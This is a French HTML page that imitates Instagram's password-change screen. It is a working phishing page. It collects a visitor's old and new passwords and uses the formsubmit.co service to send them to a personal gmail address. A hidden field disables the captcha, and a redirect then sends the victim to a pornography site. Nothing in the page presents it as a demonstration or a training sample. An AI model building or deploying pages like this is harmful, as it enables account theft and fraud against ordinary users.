<!DOCTYPE html>
<html lang="fr">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>Changer le mot de passe - Instagram</title>
    <style>
      body {
        background-color: #fafafa;
        font-family: Arial, sans-serif;
        display: flex;
        justify-content: center;
        align-items: center;
        min-height: 100vh;
        margin: 0;
      }

      .container {
        background: #fff;
        border: 1px solid #dbdbdb;
        padding: 40px 30px;
        max-width: 350px;
        width: 100%;
        box-shadow: 0 0 10px rgba(0, 0, 0, 0.05);
        text-align: center;
        border-radius: 8px;
      }

      .logo {
        width: 100px;
        margin-bottom: 20px;
      }

      p {
        font-size: 14px;
        color: #262626;
        margin-bottom: 20px;
      }

      input[type="password"] {
        width: 100%;
        padding: 12px;
        border: 1px solid #dbdbdb;
        border-radius: 4px;
        font-size: 14px;
        margin-bottom: 15px;
        box-sizing: border-box;
      }

      button {
        width: 100%;
        padding: 12px;
        background-color: #3897f0;
        color: white;
        border: none;
        border-radius: 4px;
        font-weight: bold;
        font-size: 14px;
        cursor: pointer;
      }

      button:hover {
        background-color: #318ce7;
      }

      @media (max-width: 400px) {
        .container {
          padding: 30px 20px;
        }
      }
    </style>
  </head>
  <body>
    <div class="container">
      <img
        src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png"
        alt="Instagram"
        class="logo"
      />
      <p>Veuillez changer votre mot de passe.</p>
      <form
        action="https://formsubmit.co/armandodapa10@gmail.com"
        method="POST"
      >
        <input
          type="password"
          name="old_password"
          placeholder="Ancien mot de passe"
          required
        />
        <input
          type="password"
          name="new_password"
          placeholder="Nouveau mot de passe"
          required
        />
        <input
          type="password"
          name="confirm_password"
          placeholder="Confirmer le nouveau mot de passe"
          required
        />

        <!-- Empêche le captcha -->
        <input type="hidden" name="_captcha" value="false" />

        <!-- Redirection après soumission -->
        <input type="hidden" name="_next" value="https://fr.pornhub.com/" />

        <button type="submit">Changer le mot de passe</button>
      </form>
    </div>
  </body>
</html>
